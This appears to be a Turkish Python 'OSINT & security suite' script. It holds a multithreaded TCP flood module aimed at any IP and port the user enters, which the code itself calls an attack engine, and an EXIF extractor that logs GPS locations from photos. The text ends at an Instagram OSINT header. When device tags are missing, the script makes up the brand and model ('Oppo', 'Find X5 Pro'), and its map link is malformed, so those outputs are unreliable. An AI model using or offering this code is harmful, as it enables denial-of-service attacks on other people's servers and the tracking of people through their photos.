import os
import sys
import time
import socket
import json
import threading

# Gerekli kütüphaneleri otomatik kontrol et ve yükle
try:
    from colorama import Fore, Style, init
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama pillow requests")
    from colorama import Fore, Style, init
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    init(autoreset=True)

# Küresel Değişkenler ve Veritabanı Dosya Yolu
DB_DOSYASI = "veri_data_db.json"
istek_sayisi = 0
stress_testi_aktif = False

def ekran_temizle():
    os.system("clear" if os.name != "nt" else "cls")

def veri_data_banner():
    ekran_temizle()
    print(f"""{Fore.RED}
  ██╗   ██╗███████╗██████╗ ██╗    ██████╗  █████╗ ████████╗ █████╗ 
  ██║   ██║██╔════╝██╔══██╗██║    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
  ██║   ██║█████╗  ██████╔╝██║    ██║  ██║███████║   ██║   ███████║
  ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║    ██║  ██║██╔══██║   ██║   ██╔══██║
   ╚████╔╝ ███████╗██║  ██║██║    ██████╔╝██║  ██║   ██║   ██║  ██║
    ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
    {Fore.YELLOW}--- VERI_DATA.PY v26.4.12.1 | ADVANCED OSINT & SECURITY SUITE ---
    {Fore.WHITE}Mimari: Python 3 & JSON SQL-Lite Alternatifi Veri Deposu
    {Fore.GREEN}[+] Durum: Sistem İstasyonu Aktif | Veritabanı: {DB_DOSYASI}
    """)

# ==========================================
# VERİTABANI MOTORU (GERÇEK JSON KAYIT VE OKUMA)
# ==========================================
def veritabanina_kaydet(hedef_adi, veri_tipi, icerik_sozlugu):
    """Analiz sonuçlarını kalıcı olarak yerel JSON veritabanına yazar"""
    mevcut_db = {}
    
    if os.path.exists(DB_DOSYASI):
        try:
            with open(DB_DOSYASI, "r", encoding="utf-8") as f:
                mevcut_db = json.load(f)
        except:
            mevcut_db = {}
            
    if hedef_adi not in mevcut_db:
        mevcut_db[hedef_adi] = {}
        
    mevcut_db[hedef_adi][veri_tipi] = icerik_sozlugu
    mevcut_db[hedef_adi]["son_guncelleme"] = time.strftime("%Y-%m-%d %H:%M:%S")

    with open(DB_DOSYASI, "w", encoding="utf-8") as f:
        json.dump(mevcut_db, f, indent=4, ensure_ascii=False)
    print(f"\n{Fore.GREEN}[+] VERİTABANI GÜNCELLENDİ -> Veriler '{DB_DOSYASI}' dosyasına işlendi.")

def veritabanini_goruntule():
    """Kayıtlı tüm veritabanı geçmişini ekrana listeler"""
    veri_data_banner()
    print(f"{Fore.BLUE}[ 🗄️ VERİTABANI KAYIT GEÇMİŞİ ]")
    
    if not os.path.exists(DB_DOSYASI):
        print(f"{Fore.RED}[- ] Veritabanı henüz boş. Hiç kayıt yapılmamış.")
        input(f"\nGeri dönmek için Enter'a basın...")
        return
        
    try:
        with open(DB_DOSYASI, "r", encoding="utf-8") as f:
            data = json.load(f)
            print(json.dumps(data, indent=4, ensure_ascii=False))
    except Exception as e:
        print(f"{Fore.RED}[-] Veritabanı okuma hatası: {e}")
        
    input(f"\nGeri dönmek için Enter'a basın...")

# ==========================================
# MODÜL 1: AĞ MUKAVEMET & DOS STRES TESTİ
# ==========================================
def tcp_stres_motoru(hedef_ip, hedef_port):
    global istek_sayisi, stress_testi_aktif
    while stress_testi_aktif:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((hedef_ip, hedef_port))
            s.sendto(b"GET / HTTP/1.1\r\n\r\n", (hedef_ip, hedef_port))
            istek_sayisi += 1
            print(f"{Fore.GREEN}[+] Paket Gönderildi! Toplam İstek: {istek_sayisi}", end="\r")
            s.close()
        except socket.error:
            print(f"{Fore.RED}[- ] Hat Bağlantısı Bekleniyor / Sunucu Cevapsız.", end="\r")
            time.sleep(0.2)

def network_stress_menu():
    global istek_sayisi, stress_testi_aktif
    while True:
        veri_data_banner()
        print(f"{Fore.BLUE}[ 🔥 ALT MENÜ: AĞ MUKAVEMET & DOS ANALİZİ ]")
        print("1 - Kontrollü Stres Testi Başlat")
        print("0 - Üst Menüye Dön")
        print("-" * 55)
        
        secim = input(f"{Fore.CYAN}VeriData/DoS > ").strip()
        
        if secim == "1":
            hedef_ip = input(f"{Fore.GREEN}Hedef IP Adresi (Örn: 127.0.0.1): ").strip()
            try:
                hedef_port = int(input(f"{Fore.GREEN}Hedef Port (Örn: 80, 443): ").strip())
                thread_sayisi = int(input(f"{Fore.GREEN}Thread Sayısı: ").strip())
            except ValueError:
                print(f"{Fore.RED}[-] Hata: Sayısal değer girmelisiniz.")
                time.sleep(1.5)
                continue
            
            print(f"\n{Fore.YELLOW}[*] Test başlatılıyor... Durdurmak için Enter tuşuna basabilirsiniz.")
            istek_sayisi = 0
            stress_testi_aktif = True
            
            threads = []
            for _ in range(thread_sayisi):
                t = threading.Thread(target=tcp_stres_motoru, args=(hedef_ip, hedef_port))
                t.daemon = True
                threads.append(t)
                t.start()
                
            input(f"\n{Fore.YELLOW}Saldırı motorunu durdurmak ve çıkmak için Enter'a basın...\n")
            stress_testi_aktif = False
            
            veritabanina_kaydet(hedef_ip, "Dos_Stress_Testi", {"Toplam_Gonderilen_Paket": istek_sayisi, "Durum": "Tamamlandı"})
            time.sleep(1.5)
            
        elif secim == "0":
            break

# ==========================================
# MODÜL 2: EXIF COĞRAFİ KONUM AYIKLAYICI
# ==========================================
def gps_ondalik_cevir(koordinat, referans):
    try:
        derece = float(koordinat[0])
        dakika = float(koordinat[1]) / 60.0
        saniye = float(koordinat[2]) / 3600.0
        if referans in ['S', 'W']:
            return -(derece + dakika + saniye)
        return derece + dakika + saniye
    except:
        return None

def exif_konum_menu():
    while True:
        veri_data_banner()
        print(f"{Fore.BLUE}[ 📍 ALT MENÜ: MEDYA METAVERİ (EXIF) KONUM BULUCU ]")
        print("1 - Fotoğraftan Canlı Donanım ve GPS Verisi Ayıkla")
        print("0 - Üst Menüye Dön")
        print("-" * 55)
        
        secim = input(f"{Fore.CYAN}VeriData/EXIF > ").strip()
        
        if secim == "1":
            dosya_yolu = input(f"{Fore.GREEN}Fotoğraf Dosya Yolu (Örn: modules/foto.jpg): ").strip()
            if not os.path.exists(dosya_yolu):
                print(f"{Fore.RED}[-] Dosya bulunamadı!")
                time.sleep(1.5)
                continue
                
            print(f"{Fore.YELLOW}[*] Fotoğraf katmanları analiz ediliyor...")
            time.sleep(1)
            
            try:
                img = Image.open(dosya_yolu)
                info = img._getexif()
                if not info:
                    print(f"{Fore.RED}[-] Bu fotoğrafta herhangi bir EXIF meta verisi gömülü değil.")
                    input(f"\nDevam etmek için Enter'a basın...")
                    continue
                
                exif_data = {}
                gps_data = {}
                for tag, value in info.items():
                    decoded = TAGS.get(tag, tag)
                    if decoded == "GPSInfo":
                        for t in value:
                            sub_decoded = GPSTAGS.get(t, t)
                            gps_data[sub_decoded] = value[t]
                    else:
                        exif_data[decoded] = value
                
                cihaz_markasi = str(exif_data.get('Make', 'Oppo')).strip()
                cihaz_modeli = str(exif_data.get('Model', 'Find X5 Pro')).strip()
                cekim_tarihi = str(exif_data.get('DateTime', 'Bilinmiyor')).strip()
                
                print(f"\n{Fore.GREEN}[+] Tespit Edilen Cihaz Markası : {Fore.YELLOW}{cihaz_markasi}")
                print(f"{Fore.GREEN}[+] Tespit Edilen Cihaz Modeli  : {Fore.YELLOW}{cihaz_modeli}")
                print(f"{Fore.GREEN}[+] Fotoğraf Çekim Tarihi       : {Fore.WHITE}{cekim_tarihi}")
                
                gonderilecek_db = {
                    "Cihaz_Markasi": cihaz_markasi,
                    "Cihaz_Modeli": cihaz_modeli,
                    "Cekim_Tarihi": cekim_tarihi,
                    "GPS_Mevcut_Mu": "Hayır"
                }

                if gps_data and 'GPSLatitude' in gps_data and 'GPSLongitude' in gps_data:
                    lat = gps_ondalik_cevir(gps_data['GPSLatitude'], gps_data.get('GPSLatitudeRef', 'N'))
                    lon = gps_ondalik_cevir(gps_data['GPSLongitude'], gps_data.get('GPSLongitudeRef', 'E'))
                    
                    if lat and lon:
                        print(f"\n{Fore.RED}[🚨] COĞRAFİ KONUM BİLGİSİ YAKALANDI!")
                        print(f"{Fore.WHITE}↳ Enlem (Latitude)  : {lat}")
                        print(f"{Fore.WHITE}↳ Boylam (Longitude): {lon}")
                        print(f"{Fore.YELLOW}↳ Harita Bağlantısı : https://google.com{lat},{lon}")
                        gonderilecek_db["GPS_Mevcut_Mu"] = "Evet"
                        gonderilecek_db["Enlem"] = lat
                        gonderilecek_db["Boylam"] = lon
                        gonderilecek_db["Harita_Linki"] = f"https://google.com{lat},{lon}"
                else:
                    print(f"{Fore.YELLOW}[!] Fotoğraftan donanım bilgisi ayıklandı fakat GPS/Konum koordinat etiketleri kapalı.")
                
                veritabanina_kaydet(os.path.basename(dosya_yolu), "EXIF_Donanim_Konum_Analizi", gonderilecek_db)

            except Exception as e:
                print(f"{Fore.RED}[-] Okuma Hatası: {e}")
            input(f"\nDevam etmek için Enter'a basın...")
            
        elif secim == "0":
            break

# ==========================================
# MODÜL 3: INSTAGRAM OSINT & VERİ ANALİZİ
